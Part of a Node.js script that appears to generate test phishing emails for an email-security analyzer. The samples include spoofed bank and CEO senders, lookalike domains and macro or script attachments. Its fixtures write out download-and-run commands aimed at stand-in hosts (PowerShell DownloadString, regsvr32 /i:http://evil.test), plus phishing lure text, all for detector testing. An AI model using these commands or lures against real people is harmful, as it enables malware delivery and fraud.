/**
 * generate-samples.js — 生成 26 封样例邮件(eml + 两个 mbox)
 *
 * 运行: node tools/generate-samples.js
 * 输出: public/samples/*.eml, public/samples/batches/*.mbox
 *
 * 覆盖场景:
 *  正常邮件(SPF/DKIM/DMARC 全过)、伪造发件人、显示名欺骗、Reply-To 劫持、
 *  同形异义 punycode 域名、链接文字/地址不符、宏文档、双扩展名、
 *  深层 encoded-word 嵌套(GBK/Big5/Base64/QP/RFC2231 续行)、message/rfc822 嵌套、
 *  multipart 深嵌套、过期 DKIM、SPF softfail/none、DMARC fail/quarantine、
 *  无防护小域名、脚本附件、ZIP 带毒条目、LNK、IDN、免费邮箱仿冒、群发工具头
 */
import { generateKeyPairSync, createSign, createHash } from 'node:crypto'
import { mkdirSync, writeFileSync, readdirSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

const __dirname = dirname(fileURLToPath(import.meta.url))
const OUT = join(__dirname, '..', 'public', 'samples')
const BATCH = join(OUT, 'batches')
mkdirSync(OUT, { recursive: true })
mkdirSync(BATCH, { recursive: true })

/* ---------- RSA 密钥(本地生成,公钥写进 mock-dns 的 p=) ---------- */
function rsaPair() {
  return generateKeyPairSync('rsa', { modulusLength: 2048 })
}
const keys = {
  corp: rsaPair(),
  bank: rsaPair(),
  shop: rsaPair()
}

function spkiBase64(key) {
  return key.export({ type: 'spki', format: 'der' }).toString('base64')
}

// 公钥清单:前端 mock DNS 启动时 fetch 这个文件装载
const pubkeys = {
  'selector1._domainkey.corp.example.com': 'v=DKIM1; k=rsa; p=' + spkiBase64(keys.corp.publicKey),
  'dkim._domainkey.bank.example.net': 'v=DKIM1; k=rsa; p=' + spkiBase64(keys.bank.publicKey),
  's1._domainkey.shop.example.org': 'v=DKIM1; k=rsa; p=' + spkiBase64(keys.shop.publicKey)
}
writeFileSync(join(OUT, 'dkim-keys.json'), JSON.stringify(pubkeys, null, 2))

/* ---------- MIME 基础工具 ---------- */
const b64 = (buf) => Buffer.from(buf).toString('base64')

/**
 * 多字节字符集编码。
 * Node 内置 TextEncoder 只支持 UTF-8;这里对样例用到的 gbk/big5/shift_jis/euc-kr
 * 维护一份最小字符串→字节映射(仅覆盖样例字符),映射表由 tools/charset-tables.js 提供。
 * 未命中字符回退 UTF-8 并加注释,保证生成过程不中断。
 */
import { ENCODERS } from './charset-tables.js'
function encodeText(text, charset = 'utf-8') {
  const cs = charset.toLowerCase()
  if (cs === 'utf-8') return Buffer.from(text, 'utf8')
  const enc = ENCODERS[cs]
  if (!enc) return Buffer.from(text, 'utf8')
  return Buffer.from(enc(text))
}
const qp = (buf) => {
  let out = ''
  const s = Buffer.from(buf)
  for (let i = 0; i < s.length; i++) {
    const b = s[i]
    if (b === 0x3d || b < 0x20 || b > 0x7e) out += '=' + b.toString(16).toUpperCase().padStart(2, '0')
    else if (b === 0x20) out += '_'
    else out += String.fromCharCode(b)
  }
  // 折行
  return out.replace(/(.{72})/g, '$1=\r\n')
}

/** RFC 2047 encoded-word */
function ew(text, charset = 'utf-8', enc = 'B') {
  const buf = encodeText(text, charset)
  if (enc === 'B') return `=?${charset}?B?${b64(buf)}?=`
  const q = buf
    .toString('binary')
    .split('')
    .map((c) => {
      const code = c.charCodeAt(0)
      if (c === ' ') return '_'
      if (code < 0x21 || code > 0x7e || c === '=' || c === '?' || c === '_') return '=' + code.toString(16).toUpperCase().padStart(2, '0')
      return c
    })
    .join('')
  return `=?${charset}?Q?${q}?=`
}

/** RFC 2231 续行文件名(深层编码嵌套演示) */
function rfc2231Filename(filename, charset = 'utf-8') {
  const encoded = encodeURIComponent(filename).replace(/'/g, '%27')
  const chunkSize = 12
  const chunks = []
  const total = encoded.length
  const n = Math.ceil(total / chunkSize)
  for (let i = 0; i < n; i++) {
    const part = encoded.slice(i * chunkSize, (i + 1) * chunkSize)
    if (i === 0) chunks.push(`filename*${i}*=${charset}''${part}`)
    else chunks.push(`filename*${i}*=${part}`)
  }
  return chunks.join(';\r\n\t')
}

function boundary() {
  return '----=_Part_' + createHash('md5').update(String(Math.random())).digest('hex').slice(0, 16)
}

/** 简单 multipart 组装 */
function multipart(parts, b) {
  const out = []
  for (const p of parts) {
    out.push(`--${b}`)
    out.push(p.head)
    out.push('')
    out.push(p.body)
  }
  out.push(`--${b}--`)
  return out.join('\r\n')
}

/* ---------- DKIM 真实签名(RFC 6376 relaxed/simple 等价:relaxed/relaxed) ---------- */
function dkimSign({ headers, body, domain, selector, key, signTime, expired = false, bodyCanon = 'relaxed', headerCanon = 'relaxed' }) {
  // 先把正文归一为 CRLF,再按规范化模式处理。
  // 关键:哈希必须基于最终落盘的 UTF-8 字节(与验证端 TextEncoder 一致),
  // 而不是 JS 字符串的 UTF-16 码元。
  const crlfBody = body.replace(/\r?\n/g, '\r\n')
  const normBody =
    bodyCanon === 'relaxed'
      ? crlfBody
          .replace(/[ \t]+\r\n/g, '\r\n')
          .replace(/[ \t]{2,}/g, ' ')
          .replace(/\r\n+$/, '') + '\r\n'
      : crlfBody.endsWith('\r\n')
        ? crlfBody
        : crlfBody + '\r\n'
  const bh = createHash('sha256').update(Buffer.from(normBody, 'utf8')).digest('base64')

  const headerNames = ['from', 'to', 'subject', 'date', 'message-id', 'mime-version', 'content-type']
  const hMap = {}
  for (const line of headers) {
    const k = line.slice(0, line.indexOf(':')).toLowerCase()
    ;(hMap[k] = hMap[k] || []).push(line)
  }
  let signed = ''
  for (const name of headerNames) {
    if (!hMap[name]) continue
    const line = hMap[name][hMap[name].length - 1]
    const colon = line.indexOf(':')
    if (headerCanon === 'relaxed') {
      signed += name + ':' + line.slice(colon + 1).replace(/\r?\n[ \t]+/g, ' ').trim().replace(/[ \t]{2,}/g, ' ') + '\r\n'
    } else {
      signed += line + '\r\n'
    }
  }
  const xValue = expired ? signTime - 3600 : signTime + 7 * 86400
  const signedHeaderList = headerNames.filter((n) => hMap[n]).join(':')
  // 标签顺序固定:v/a/c/d/s/h/bh/x,最后才是 b。
  // 待签名内容:DKIM 签名头自身的 b= 标签置空(relaxed 规范化,无尾 CRLF)
  const selfForSign = `dkim-signature:v=1; a=rsa-sha256; c=${headerCanon}/${bodyCanon}; d=${domain}; s=${selector}; h=${signedHeaderList}; bh=${bh}; x=${xValue}; b=`
  const toSign = signed + selfForSign
  const sigB64 = createSign('RSA-SHA256').update(toSign).sign(key, 'base64').replace(/(.{70})/g, '$1\r\n\t')
  // 输出到邮件的签名头:与待签名串同序,b= 填入真实签名
  const sigHead =
    `v=1; a=rsa-sha256; c=${headerCanon}/${bodyCanon}; d=${domain}; s=${selector};\r\n\t` +
    `h=${signedHeaderList}; bh=${bh}; x=${xValue};\r\n\t` +
    `b=${sigB64}`
  return `DKIM-Signature: ${sigHead}`
}

/* ---------- 通用邮件骨架 ---------- */
let seq = 0
function msgId(domain) {
  seq++
  return `<${createHash('md5').update(String(seq) + Math.random()).digest('hex').slice(0, 18)}@${domain}>`
}

// 以生成时刻为基准,保证 DKIM 签名在当下有效(过期样本单独回拨时间)
const NOW = Math.floor(Date.now() / 1000)
function dateHeader(offsetSec = 0) {
  return new Date((NOW + offsetSec) * 1000).toUTCString()
}

/** 把 From 头里非 ASCII 的显示名自动转成 encoded-word,保证待签名头为纯 ASCII */
function encodeFromHeader(from) {
  // 形如 "显示名" <addr> 或 显示名 <addr>
  return from.replace(/^"([^"]*)"\s*(<.*>)$/, (whole, name, addr) => {
    if (/^[\x00-\x7f]+$/.test(name)) return whole
    return `${ew(name, 'utf-8', 'B')} ${addr}`
  })
}

function baseHeaders({ from, to, subject, domain, extra = [], dateOffset = 0 }) {
  return [
    `From: ${encodeFromHeader(from)}`,
    `To: ${to}`,
    `Subject: ${subject}`,
    `Date: ${dateHeader(dateOffset)}`,
    `Message-ID: ${msgId(domain)}`,
    'MIME-Version: 1.0',
    ...extra
  ]
}

function receivedChain(hops) {
  // RFC 5322:最新接收的一跳写在最前面。hops 按投递方向(发件→收件)给出,
  // 输出时反转,使最终 MTA 在最前、最早的发件一跳在最后。
  return [...hops].reverse().map((h) => `Received: from ${h.from} (${h.rdns} [${h.ip}])\r\n\tby ${h.by} with ${h.proto} id ${h.id};\r\n\t${h.date}`)
}

/* ---------- 附件字节工厂 ---------- */
function oleWithMacro(name) {
  // OLE2 魔数 + 宏特征字符串(静态分析可识别,不是真文件)
  const head = Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])
  const tail = Buffer.from(
    '\r\n\x00This is a simulated OLE compound doc.\r\n_VBA_PROJECT\r\nSub AutoOpen()\r\n  CreateObject("WScript.Shell").Run "powershell -enc SQBFAFgA"\r\nEnd Sub\r\n' + name,
    'binary'
  )
  return Buffer.concat([head, tail])
}
function olePlain() {
  return Buffer.concat([
    Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]),
    Buffer.from('simulated legacy .doc without macro markers, plain quarterly report text content repeated. '.repeat(40), 'binary')
  ])
}
function peFile() {
  return Buffer.concat([Buffer.from('MZ'), Buffer.from([0x90, 0x00, 0x03]), Buffer.from('simulated PE payload, DownloadString + certutil -decode strings inside. '.repeat(30), 'binary')])
}
function zipWith(entries) {
  // 真实 ZIP(用 store 模式手工拼),保证魔数 + 中央目录扫描可用
  const localParts = []
  const central = []
  let offset = 0
  const crcTable = []
  for (const [name, content] of entries) {
    const nameBuf = Buffer.from(name)
    const data = Buffer.from(content)
    const crc = crc32(data)
    const local = Buffer.alloc(30)
    local.writeUInt32LE(0x04034b50, 0)
    local.writeUInt16LE(20, 4)
    local.writeUInt16LE(0, 6)
    local.writeUInt16LE(0, 8) // store
    local.writeUInt16LE(0, 10)
    local.writeUInt16LE(0, 12)
    local.writeUInt32LE(crc, 14)
    local.writeUInt32LE(data.length, 18)
    local.writeUInt32LE(data.length, 22)
    local.writeUInt16LE(nameBuf.length, 26)
    local.writeUInt16LE(0, 28)
    const localFull = Buffer.concat([local, nameBuf, data])
    localParts.push(localFull)

    const cd = Buffer.alloc(46)
    cd.writeUInt32LE(0x02014b50, 0)
    cd.writeUInt16LE(20, 4)
    cd.writeUInt16LE(20, 6)
    cd.writeUInt16LE(0, 8)
    cd.writeUInt16LE(0, 10)
    cd.writeUInt16LE(0, 12)
    cd.writeUInt16LE(0, 14)
    cd.writeUInt32LE(crc, 16)
    cd.writeUInt32LE(data.length, 20)
    cd.writeUInt32LE(data.length, 24)
    cd.writeUInt16LE(nameBuf.length, 28)
    cd.writeUInt32LE(offset, 42)
    central.push(Buffer.concat([cd, nameBuf]))
    offset += localFull.length
  }
  const cdBuf = Buffer.concat(central)
  const localBuf = Buffer.concat(localParts)
  const eocd = Buffer.alloc(22)
  eocd.writeUInt32LE(0x06054b50, 0)
  eocd.writeUInt16LE(entries.length, 8)
  eocd.writeUInt16LE(entries.length, 10)
  eocd.writeUInt32LE(cdBuf.length, 12)
  eocd.writeUInt32LE(localBuf.length, 16)
  return Buffer.concat([localBuf, cdBuf, eocd])
}
function crc32(buf) {
  let c = ~0
  for (const b of buf) {
    c ^= b
    for (let k = 0; k < 8; k++) c = (c >>> 1) ^ (0xedb88320 & -(c & 1))
  }
  return ~c >>> 0
}
function pdfFile() {
  return Buffer.from('%PDF-1.7\n1 0 obj<< /Type /Catalog >>endobj\n%%EOF simulated invoice pdf content\n', 'binary')
}
function scriptFile(kind) {
  const bodies = {
    js: 'var w = new ActiveXObject("WScript.Shell");\nw.Exec("powershell -enc SQBFAFgA");\n// FromBase64String downloader\n',
    vbs: 'Set x = CreateObject("WScript.Shell")\nx.Run "cmd.exe /c certutil -decode c:\\t.b64 c:\\t.exe"\nAutoOpen stub\n',
    ps1: 'IEX (New-Object Net.WebClient).DownloadString("http://phish-login.example.top/a.ps1")\n',
    bat: '@echo off\r\npowershell -enc SQBFAFgA\r\nregsvr32 /s /u /i:http://evil.test/x.sct scrobj.dll\r\n',
    lnk: Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.from('LNK simulated target: cmd.exe /c powershell, working dir AppData\\Temp\r\n')])
  }
  return Buffer.from(bodies[kind] || bodies.js, 'binary')
}

/* ---------- 场景定义 ---------- */
const samples = []
function add(file, content) {
  samples.push({ file, content: Buffer.from(content, 'utf8') })
}

const corpHops = [
  { from: 'smtp.corp.example.com', rdns: 'mx1.corp.example.com', ip: '203.0.113.10', by: 'mx1.corp.example.com', proto: 'ESMTPS', id: 'AAA01', date: new Date(NOW * 1000).toUTCString() },
  { from: 'mx1.corp.example.com', rdns: 'mx1.corp.example.com', ip: '203.0.113.10', by: 'mailgw.internal.local', proto: 'ESMTPS', id: 'BBB02', date: new Date((NOW + 2) * 1000).toUTCString() }
]
const evilHops = [
  { from: 'bulk-mailer.evil.test', rdns: 'bulk-mailer.evil.test', ip: '45.9.148.77', by: 'edge.corp.example.com', proto: 'ESMTP', id: 'EV1', date: new Date(NOW * 1000).toUTCString() },
  { from: 'edge.corp.example.com', rdns: 'edge.corp.example.com', ip: '10.0.0.1', by: 'mailgw.internal.local', proto: 'ESMTPS', id: 'EV2', date: new Date((NOW + 3) * 1000).toUTCString() }
]

/* 1. 完全正常的企业邮件,SPF/DKIM/DMARC 全过 */
{
  const b = boundary()
  const body = '各位同事,\r\n\r\n下周一上午 10 点开季度例会,请提前准备部门汇报材料。\r\n\r\n行政部\r\n'
  const headers = baseHeaders({
    from: '"行政部" <admin@corp.example.com>',
    to: 'staff@corp.example.com',
    subject: ew('季度例会通知【请查收】'),
    domain: 'corp.example.com',
    extra: ['Content-Type: multipart/alternative; boundary="' + b + '"', ...receivedChain(corpHops), 'Return-Path: <admin@corp.example.com>']
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body },
      { head: 'Content-Type: text/html; charset=utf-8', body: `<html><body><p>各位同事,</p><p>下周一上午 10 点开季度例会。</p><p>行政部</p></body></html>` }
    ],
    b
  )
  const sig = dkimSign({ headers, body: fullBody, domain: 'corp.example.com', selector: 'selector1', key: keys.corp.privateKey, signTime: NOW })
  add('01-正常企业邮件-三认证全过.eml', [...headers, sig, '', fullBody].join('\r\n'))
}

/* 2. 正常银行对账单(严格 DMARC reject,全过) */
{
  const body = '尊敬的客户,您的月度对账单见附件 PDF。\r\n'
  const att = pdfFile()
  const b = boundary()
  const headers = baseHeaders({
    from: '"银行电子账单" <estatement@bank.example.net>',
    to: 'user@corp.example.com',
    subject: 'Your bank statement is ready',
    domain: 'bank.example.net',
    extra: [
      'Content-Type: multipart/mixed; boundary="' + b + '"',
      ...receivedChain([
        { from: 'mail.bank.example.net', rdns: 'mail.bank.example.net', ip: '198.51.100.40', by: 'edge.corp.example.com', proto: 'ESMTPS', id: 'BK1', date: new Date(NOW * 1000).toUTCString() }
      ]),
      'Return-Path: <estatement@bank.example.net>'
    ]
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body },
      {
        head: 'Content-Type: application/pdf; name="statement.pdf"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="statement.pdf"',
        body: att.toString('base64').replace(/(.{76})/g, '$1\r\n')
      }
    ],
    b
  )
  const sig = dkimSign({ headers, body: fullBody, domain: 'bank.example.net', selector: 'dkim', key: keys.bank.privateKey, signTime: NOW })
  add('02-正常银行账单-DMARC-reject.eml', [...headers, sig, '', fullBody].join('\r\n'))
}

/* 3. 伪造发件人:From 冒充银行,实际从 evil.test 发出,SPF fail + DMARC fail */
{
  const b = boundary()
  const body = '您的账户存在异常,请立即验证:\r\nhttp://phish-login.example.top/verify?account=user\r\n'
  const headers = baseHeaders({
    from: '"安全中心" <security@bank.example.net>',
    to: 'user@corp.example.com',
    subject: ew('【紧急】您的银行账户已被限制,请立即验证'),
    domain: 'bank.example.net',
    extra: ['Content-Type: multipart/alternative; boundary="' + b + '"', ...receivedChain(evilHops), 'Return-Path: <security@bank.example.net>', 'X-Mailer: PHP/7.4.3']
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body },
      {
        head: 'Content-Type: text/html; charset=utf-8',
        body: `<html><body><p>您的账户存在异常,<a href="http://phish-login.example.top/verify?account=user&token=abc123">点击立即验证</a></p></body></html>`
      }
    ],
    b
  )
  add('03-伪造银行发件人-SPF-DMARC双失败.eml', [...headers, '', fullBody].join('\r\n'))
}

/* 4. 显示名欺骗:From 显示 service@bank,真实地址免费邮箱 */
{
  const b = boundary()
  const headers = baseHeaders({
    from: '"service@bank.example.net" <hotline.support88@gmail.com>',
    to: 'finance@corp.example.com',
    subject: ew('付款信息确认'),
    domain: 'gmail.com',
    extra: ['Content-Type: text/plain; charset=utf-8', ...receivedChain(evilHops), 'Return-Path: <hotline.support88@gmail.com>']
  })
  const body = '财务您好,请将货款付至新账户,详情见附件。\r\n'
  add('04-显示名内嵌假邮箱-免费邮箱仿冒.eml', [...headers, '', body].join('\r\n'))
}

/* 5. Reply-To 劫持:发件域看起来正常,回复却去攻击者邮箱 */
{
  const headers = baseHeaders({
    from: '"CEO 张伟" <ceo@corp.example.com>',
    to: 'finance@corp.example.com',
    subject: ew('紧急:安排一笔预付款'),
    domain: 'corp.example.com',
    extra: [
      'Content-Type: text/plain; charset=utf-8',
      'Reply-To: "CEO" <zhangwei.ceo1984@outlook.com>',
      ...receivedChain(evilHops),
      'Return-Path: <ceo@bulk-mailer.evil.test>',
      'X-Priority: 1 (Highest)'
    ]
  })
  const body = '我在开会不方便接电话,你现在安排一笔 28 万预付款,回复邮件我发你账户。\r\n'
  add('05-Reply-To劫持-BEC商务诈骗.eml', [...headers, '', body].join('\r\n'))
}

/* 6. 链接文字与真实地址不一致(标红核心场景) */
{
  const b = boundary()
  const html =
    '<html><body><p>请通过以下入口登录系统:</p>' +
    '<p><a href="http://phish-login.example.top/login">https://mail.corp.example.com/owa/login</a></p>' +
    '<p>或者 <a href="https://xn--bnak-5qa.example.net/login">www.bank.example.net</a></p>' +
    '<p><a href="https://invoice-cdn.example.xyz/r?url=https://corp.example.com">工单系统</a></p>' +
    '</body></html>'
  const headers = baseHeaders({
    from: '"IT 支持" <it@corp.example.com>',
    to: 'staff@corp.example.com',
    subject: '邮箱配额超限提醒',
    domain: 'evil.test',
    extra: ['Content-Type: multipart/alternative; boundary="' + b + '"', ...receivedChain(evilHops), 'Return-Path: <it@bulk-mailer.evil.test>']
  })
  const text = '登录: https://mail.corp.example.com/owa/login (实际被替换)\r\n'
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body: text },
      { head: 'Content-Type: text/html; charset=utf-8', body: html }
    ],
    b
  )
  add('06-链接显示与真实地址不符-标红.eml', [...headers, '', fullBody].join('\r\n'))
}

/* 7. punycode 同形异义域名(bank→bаnk 类) */
{
  const headers = baseHeaders({
    from: '"银行通知" <no-reply@xn--bnak-5qa.example.net>',
    to: 'user@corp.example.com',
    subject: ew('网银安全升级通知'),
    domain: 'xn--bnak-5qa.example.net',
    extra: ['Content-Type: text/html; charset=utf-8', ...receivedChain(evilHops), 'Return-Path: <no-reply@xn--bnak-5qa.example.net>']
  })
  const body = `<html><body>请访问 <a href="https://xn--bnak-5qa.example.net/auth?redirect=/account">网银登录</a> 完成升级。</body></html>`
  add('07-punycode同形异义域名.eml', [...headers, '', body].join('\r\n'))
}

/* 8. 宏文档附件(AutoOpen + WScript.Shell) */
{
  const b = boundary()
  const doc = oleWithMacro('工资表.doc')
  const headers = baseHeaders({
    from: '"人事部" <hr@corp.example.com>',
    to: 'staff@corp.example.com',
    subject: ew('11月工资明细表(启用宏查看)'),
    domain: 'evil.test',
    extra: ['Content-Type: multipart/mixed; boundary="' + b + '"', ...receivedChain(evilHops), 'Return-Path: <hr@bulk-mailer.evil.test>']
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body: '工资明细见附件,启用宏后可查看完整内容。\r\n' },
      {
        head: 'Content-Type: application/msword; name="11月工资表.doc"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="11月工资表.doc"',
        body: doc.toString('base64').replace(/(.{76})/g, '$1\r\n')
      }
    ],
    b
  )
  add('08-带VBA宏的Word文档.eml', [...headers, '', fullBody].join('\r\n'))
}

/* 9. 双扩展名伪装 发票.pdf.exe */
{
  const b = boundary()
  const exe = peFile()
  const headers = baseHeaders({
    from: '"电子发票平台" <noreply@invoice.example.org>',
    to: 'ap@corp.example.com',
    subject: ew('您的电子发票已开具'),
    domain: 'evil.test',
    extra: ['Content-Type: multipart/mixed; boundary="' + b + '"', ...receivedChain(evilHops), 'Return-Path: <noreply@bulk-mailer.evil.test>']
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body: '发票文件见附件。\r\n' },
      {
        head: 'Content-Type: application/octet-stream\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="发票_202611.pdf.exe"',
        body: exe.toString('base64').replace(/(.{76})/g, '$1\r\n')
      }
    ],
    b
  )
  add('09-双扩展名发票pdf-exe.eml', [...headers, '', fullBody].join('\r\n'))
}

/* 10. 深层编码嵌套:GBK 主题 Base64 + Big5 显示名 QP + RFC2231 续行文件名 */
{
  const b = boundary()
  // 外层 Big5 encoded-word
  const big5Subject = ew('關於採購合同修訂的確認函(繁體)', 'big5', 'B')
  // 嵌套 encoded-word:内层是合法的 GBK Base64 encoded-word,整体再被 UTF-8 B 包一层
  const innerGbkWord = '=?gbk?B?' + b64(encodeText('采购合同附件', 'gbk')) + '?='
  const nestedSubject = '=?utf-8?B?' + b64(Buffer.from(innerGbkWord, 'utf8')) + '?='
  const doc = oleWithMacro('合同附件.docm')
  const headers = baseHeaders({
    from: ew('採購部陳經理', 'big5', 'Q') + ' <chen@shop.example.org>',
    to: 'contract@corp.example.com',
    subject: big5Subject + ' ' + nestedSubject,
    domain: 'shop.example.org',
    extra: ['Content-Type: multipart/mixed; boundary="' + b + '"', ...receivedChain(evilHops), 'Return-Path: <chen@bulk-mailer.evil.test>']
  })
  const fname = rfc2231Filename('採購合同_修訂版(最終稿).docm', 'utf-8')
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset="gbk"\r\nContent-Transfer-Encoding: quoted-printable', body: qp(encodeText('合同修订版见附件,请尽快确认回传。', 'gbk')) },
      {
        head:
          'Content-Type: application/vnd.ms-word.document.macroEnabled.12;\r\n\t' +
          fname +
          '\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment;\r\n\t' +
          fname.replace(/filename\*/g, 'filename*'),
        body: doc.toString('base64').replace(/(.{76})/g, '$1\r\n')
      }
    ],
    b
  )
  add('10-深层编码嵌套-GBK-Big5-RFC2231.eml', [...headers, '', fullBody].join('\r\n'))
}

/* 11. message/rfc822 嵌套转发(攻击载荷藏在转发邮件里) */
{
  const outer = boundary()
  const innerB = boundary()
  const innerBody = multipart(
    [
      { head: 'Content-Type: text/html; charset=utf-8', body: '<a href="http://secure-bank.example.top/wf">网银升级</a> 请输入账号密码。' },
      {
        head: 'Content-Type: application/zip; name="update.zip"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="update.zip"',
        body: zipWith([['readme.txt', 'invoice'], ['loader.exe', 'MZ fake pe DownloadString payload']]).toString('base64').replace(/(.{76})/g, '$1\r\n')
      }
    ],
    innerB
  )
  const innerMsg =
    [
      'From: "银行客服" <service@bank.example.net>',
      'To: victim@corp.example.com',
      'Subject: 网银系统升级',
      'Date: ' + new Date(NOW * 1000).toUTCString(),
      'Message-ID: ' + msgId('bank.example.net'),
      'MIME-Version: 1.0',
      'Content-Type: multipart/mixed; boundary="' + innerB + '"',
      '',
      innerBody
    ].join('\r\n')
  const headers = baseHeaders({
    from: '"同事转发" <colleague@shop.example.org>',
    to: 'victim@corp.example.com',
    subject: ew('转发:网银系统升级'),
    domain: 'shop.example.org',
    extra: ['Content-Type: multipart/mixed; boundary="' + outer + '"', ...receivedChain(evilHops), 'Return-Path: <colleague@bulk-mailer.evil.test>']
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body: '看下这封银行邮件。\r\n' },
      {
        head: 'Content-Type: message/rfc822',
        body: innerMsg
      }
    ],
    outer
  )
  add('11-message-rfc822嵌套转发-藏载荷.eml', [...headers, '', fullBody].join('\r\n'))
}

/* 12. 五层 multipart 深嵌套 */
{
  // 递归包裹:depth 层 multipart/mixed,最内层是纯文本叶子
  const wrap = (depth) => {
    const bb = boundary()
    if (depth === 0) {
      return {
        outerBoundary: bb,
        head: `Content-Type: text/plain; charset=utf-8`,
        body: '深层文本:点击 http://phish-login.example.top/deep 领取奖励。\r\n'
      }
    }
    const inner = wrap(depth - 1)
    const body = `--${bb}\r\n${inner.head}\r\n\r\n${inner.body}--${bb}--\r\n`
    return { outerBoundary: bb, head: `Content-Type: multipart/mixed; boundary="${bb}"`, body }
  }
  const nested = wrap(5)
  const headers = baseHeaders({
    from: '"福利专员" <gift@shop.example.org>',
    to: 'staff@corp.example.com',
    subject: ew('员工福利领取通知'),
    domain: 'shop.example.org',
    extra: [nested.head, ...receivedChain(evilHops), 'Return-Path: <gift@bulk-mailer.evil.test>']
  })
  add('12-五层multipart深嵌套.eml', [...headers, '', nested.body].join('\r\n'))
}

/* 13. DKIM 签名过期 */
{
  const b = boundary()
  const body = '请查收合同。\r\n'
  const headers = baseHeaders({
    from: '"合同管理" <contracts@shop.example.org>',
    to: 'legal@corp.example.com',
    subject: 'Contract renewal',
    domain: 'shop.example.org',
    extra: ['Content-Type: multipart/alternative; boundary="' + b + '"', ...receivedChain(evilHops), 'Return-Path: <contracts@shop.example.org>']
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body },
      { head: 'Content-Type: text/html; charset=utf-8', body: '<p>Please find the contract.</p>' }
    ],
    b
  )
  const sig = dkimSign({ headers, body: fullBody, domain: 'shop.example.org', selector: 's1', key: keys.shop.privateKey, signTime: NOW, expired: true })
  add('13-DKIM签名已过期.eml', [...headers, sig, '', fullBody].join('\r\n'))
}

/* 14. DKIM 签名被篡改(bh 不匹配) */
{
  const b = boundary()
  const body = '原始内容\r\n'
  const headers = baseHeaders({
    from: '"商城客服" <care@shop.example.org>',
    to: 'user@corp.example.com',
    subject: 'Order confirmation',
    domain: 'shop.example.org',
    extra: ['Content-Type: multipart/alternative; boundary="' + b + '"', ...receivedChain(evilHops), 'Return-Path: <care@shop.example.org>']
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body: body },
      { head: 'Content-Type: text/html; charset=utf-8', body: '<p>tampered body with http://phish-login.example.top/x</p>' }
    ],
    b
  )
  let sig = dkimSign({ headers, body: fullBody, domain: 'shop.example.org', selector: 's1', key: keys.shop.privateKey, signTime: NOW })
  // 破坏签名:替换 b= 的一个字符
  sig = sig.replace(/(b=[A-Za-z0-9+/]{4})[A-Za-z0-9+/]/, '$1X')
  add('14-DKIM签名被篡改-验证失败.eml', [...headers, sig, '', fullBody].join('\r\n'))
}

/* 15. SPF softfail + DMARC p=none(shop 域) */
{
  const softHops = [
    { from: 'unknown-sender.example.xyz', rdns: 'unknown-hosting.evil.test', ip: '45.9.148.91', by: 'edge.corp.example.com', proto: 'ESMTP', id: 'SF1', date: new Date(NOW * 1000).toUTCString() }
  ]
  const headers = baseHeaders({
    from: '"促销通知" <sale@shop.example.org>',
    to: 'user@corp.example.com',
    subject: ew('限时促销最后一天'),
    domain: 'shop.example.org',
    extra: ['Content-Type: text/plain; charset=utf-8', ...receivedChain(softHops), 'Return-Path: <sale@shop.example.org>']
  })
  add('15-SPF-softfail-DMARC-none.eml', [...headers, '', '限时促销,点击 http://invoice-cdn.example.xyz/promo 查看。\r\n'].join('\r\n'))
}

/* 16. 无 SPF/DKIM/DMARC 的小域名 */
{
  const noAuthHops = [
    { from: 'mbx.smallco.example.io', rdns: 'mbx.smallco.example.io', ip: '192.0.2.200', by: 'edge.corp.example.com', proto: 'ESMTP', id: 'NA1', date: new Date(NOW * 1000).toUTCString() }
  ]
  const headers = baseHeaders({
    from: '"SmallCo Support" <support@smallco.example.io>',
    to: 'user@corp.example.com',
    subject: 'Your SmallCo trial expires soon',
    domain: 'smallco.example.io',
    extra: ['Content-Type: text/plain; charset=utf-8', ...receivedChain(noAuthHops), 'Return-Path: <support@smallco.example.io>']
  })
  add('16-无任何邮件认证的小域名.eml', [...headers, '', 'Your trial expires in 3 days. Renew at http://smallco.example.io/renew\r\n'].join('\r\n'))
}

/* 17. 脚本附件 .js + .vbs 双附件 */
{
  const b = boundary()
  const headers = baseHeaders({
    from: '"财务系统" <fin@corp.example.com>',
    to: 'staff@corp.example.com',
    subject: ew('报销系统升级脚本(请运行)'),
    domain: 'evil.test',
    extra: ['Content-Type: multipart/mixed; boundary="' + b + '"', ...receivedChain(evilHops), 'Return-Path: <fin@bulk-mailer.evil.test>']
  })
  const fullBody = multipart(
    [
      { head: 'Content-Type: text/plain; charset=utf-8', body: '运行附件脚本完成升级。\r\n' },
      {
        head: 'Content-Type: application/octet-stream\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="update.js"',
        body: scriptFile('js').toString('base64').replace(/(.{76})/g, '$1\r\n')
      },
      {
        head: 'Content-Type: application/octet-stream\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="fix.vbs"',
        body: scriptFile('vbs').toString('base64').replace(/(.{76})/g, '$1\r\n')
      }
    ],
    b
  )
  add('17-脚本附件js-vbs.eml', [...headers, '', fullBody].join('\r\n'))
}

/* 18. ZIP 内含 exe + 路径穿越条目 */
{
  const b = boundary()
